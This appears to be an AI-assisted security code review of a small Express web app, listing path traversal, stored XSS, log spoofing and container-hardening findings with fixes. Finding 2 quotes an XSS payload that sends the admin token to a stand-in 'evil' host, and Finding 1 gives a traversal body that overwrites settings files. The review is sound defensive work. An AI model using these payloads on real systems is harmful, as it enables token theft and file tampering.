# Code review - picture-engraver (2026-11-04)

> **Update:** fixes for #1-#6 and #7/#8 (partly) were applied on branch `security-fixes-review` and pushed to `main` at the
> user's request. Not done: CSP (needs inline-script refactor), node 18 -> newer, CI tests, full settings schema validation.
> No node/npm exists on the host, so the fixes + new tests were NOT executed locally; verify on the test instance.


Scope read in full: `server.js`, `admin-routes.js`, `src/lib/admin-settings.js`, Dockerfile/entrypoint/compose, CI workflow,
parts of `src/admin.html`, `src/main.js` (grep for sinks only), git history grep for secrets.

## Summary
Small app, mostly client-side, with a minimal Express backend and one shared admin token. No secrets found in the repo
or history (only placeholders). Main risks: admin-only path traversal via color-map `id`, stored XSS in the admin UI,
unauthenticated memory growth / log spoofing via `X-Forwarded-For`, container runs as root, and no security headers.
Nothing found that gives an anonymous user code execution or data access.

## Findings (by severity)

### 1. MEDIUM - Path traversal via color map `id` (admin-authenticated)
- `src/lib/admin-settings.js:668-669` (`saveColorMap`), also `:601-602` (`getColorMap`), `:688-691` (`deleteColorMap`), `:731`.
- `id` is used unvalidated in `path.join(dir, `${id}.json`)`. `POST /admin/api/colormaps` takes `id` from the body
  (`admin-routes.js:~296`); `PUT/GET/DELETE /admin/api/colormaps/:id` take it from the URL (encoded `%2e%2e%2f` works).
  `validateColorMap` does not check `id`.
- Scenario: holder of the admin token (or a stolen token) POSTs `{"id":"../../admin-settings","name":..}` -> overwrites
  `DATA_DIR/admin-settings.json` / any `*.json` writable by the process (container runs as root); DELETE can unlink any `*.json`.
  Impact is limited to `.json` files, but combined with root user and the XSS below it raises the blast radius.
- Fix: validate `id` against `/^[A-Za-z0-9_-]{1,64}$/` in `validateColorMap` and all id-taking methods; also check
  `path.resolve(filePath).startsWith(path.resolve(dir)+path.sep)`.

### 2. MEDIUM - Stored/DOM XSS in admin UI via color map name/id
- `src/admin.html:951,956` : `onclick="downloadMap('${esc(m.id)}', '${esc(m.name)}')"`. `esc()` (`:964-969`) uses
  `textContent->innerHTML`, which escapes `& < >` but **not quotes**, so a name like `x');fetch('//evil/'+sessionStorage._adminToken);('`
  breaks out of the JS string. Names/ids come from uploaded Analyzer export JSON.
- Scenario: admin imports a crafted map file (or attacker with token plants one); next admin page load executes JS and
  can read the token from `sessionStorage` (`admin.html:484,874`).
- Fix: use `addEventListener` + `data-` attributes, or escape quotes; combine with a CSP (see #6).

### 3. MEDIUM - Unauthenticated memory growth and log spoofing through `X-Forwarded-For`
- `server.js:163-166, 186-188` (`stats.visitors` Set), `:122` (morgan token), `:150-181`.
- IP is taken from the raw `X-Forwarded-For` header, not `req.ip`. Caddy appends but a client can send an arbitrary
  header value (up to header size limit) -> each distinct value is stored forever in `stats.visitors` (unbounded Set).
  Also lets clients forge IPs in logs and sidestep nothing in rate limiting (express-rate-limit uses `req.ip`, fine).
- Scenario: loop `GET /` with random XFF values -> RSS grows until the container OOMs (shared host: 62 GB, little headroom).
- Fix: use `req.ip` (trust proxy already =1), cap/replace the Set with a counter/HyperLogLog or hashed bounded cache.

### 4. MEDIUM - Container runs as root; data dir world-writable
- `Dockerfile:25-27,31`: no `USER`; `CMD ["node","server.js"]` bypasses `docker-entrypoint.sh` (which also needs `su-exec`
  that is not installed in the image, and is never COPY'd). `chmod 777 /app/data /app/logs`.
- Impact: any RCE/traversal (#1) runs as root inside the container. Fix: `USER node`, chown dirs, drop 777.

### 5. LOW-MEDIUM - `/api/log` accepts unbounded/unvalidated client input
- `server.js:150-181`. `level` and `details` are unvalidated (any object up to the 5 MB JSON body limit, 100 req/15 min/IP)
  and written to disk as JSON lines (`LOG_DIR`, never rotated/pruned) -> disk fill (~500 MB per IP per 15 min worst case).
  Console formatting (`:50-66`) interpolates `details` values and `message` without stripping newlines -> log forging.
  Also `JSON.stringify` of `details` containing a key like `timestamp`/`level` is overridden by spread order (`...data` after
  fixed fields, `:41-46`) so clients can forge timestamp/level fields in file logs.
- Fix: whitelist `level`, cap `details` size/depth, strip control chars, put fixed fields after `...data`, rotate/prune logs,
  use a small body limit for `/api/log` (global `express.json({limit:'5mb'})` at `:140` applies to every route, including public ones).

### 6. LOW - No security headers / wide-open CORS
- `server.js:139` `cors()` for all origins on all routes (incl. `/admin/api/*`; bearer auth so not CSRF-exploitable, but unnecessary).
  `helmet` is in `package.json` but never used: no CSP, X-Frame-Options, nosniff, HSTS (Caddy may add some - not verified).
- Fix: `app.use(helmet(...))` with a CSP compatible with the inline admin script (or move it to a file), restrict CORS to the public GET APIs.

### 7. LOW - Admin token handling
- `admin-routes.js:~66-90`: token length leak via early length compare (acceptable); custom `timingSafeEqual` instead of
  `crypto.timingSafeEqual`. Rate limit 30/min per IP is the only brute-force protection; no minimum token length enforced,
  `docker-compose.yml` / docs use `your-secret-token` placeholders. Token stored in sessionStorage (XSS-readable, see #2).
- Fix: use `crypto.timingSafeEqual` on SHA-256 digests, enforce a min token length at startup, log failed attempts.

### 8. LOW - Settings save accepts arbitrary keys; backups accumulate
- `admin-settings.js:359-391`: `{...settings}` is persisted verbatim (only `testGridDefaults` validated); `visibility` /
  `laserCapabilities` validated elsewhere. A new `-backup-<ts>.json` is written on **every** save and never pruned.
  `PATCH visibility`/`capabilities` do not call `invalidateXcsCache()` (`admin-routes.js` ~250-262) though the
  cached XCS may depend on them (only if generator depends on those; unverified). `validateTestGridSettings` does not
  type-check many fields (e.g. `power` as a string passes `<0 || >100` comparisons; `qr*`, `lpi`, `freq*` unchecked), so
  bad values reach the generator and produce 500s or corrupt .xcs files served publicly (`/api/testgrid/*` is cached).
- Fix: schema-validate (whitelist keys + types), prune backups (keep N).

### 9. LOW - Maintainability / robustness
- `Dockerfile` uses `node:18-alpine` (EOL since April 2025); `npm install` rather than `npm ci`.
- Prod image copies a hand-picked list of `src/lib` files (see CLAUDE.md gotcha) - fragile.
- `app.get('*')` SPA fallback also serves `index.html` (HTTP 200) for missing assets/API typos.
- `docker-build.yml` tags `:latest` on every push and the deploy job pulls `:latest`: no gating by tests (CI does not run vitest).
- `src/main.js:1176` interpolates `m.name` into innerHTML; currently static registry data, safe today.
- Default `PORT` 80 and bind `0.0.0.0`.

## Not covered
- Client-side logic in `src/main.js` (7.8k lines), image processing, XCS/XS generators, QR/grid detection, localStorage import/export (potential parsing/DoS issues on user files; only grep'd for innerHTML sinks).
- `npm audit` / dependency CVEs (no `node_modules`, did not install; express 4.21, vite 5, potrace, jszip should be checked).
- Unit/e2e tests were not run (install of `canvas` is heavy); test quality/coverage not assessed.
- Live deployment: actual Caddy headers, how `engraver-test`/prod are configured, env vars, volumes - not inspected (off-limits).
- Full git history diff for secrets was only grepped (ADMIN_TOKEN, password/key patterns); 198 commits.
- Docs under `docs/` and `scripts/`, `.github` secrets configuration, Docker Hub image contents.
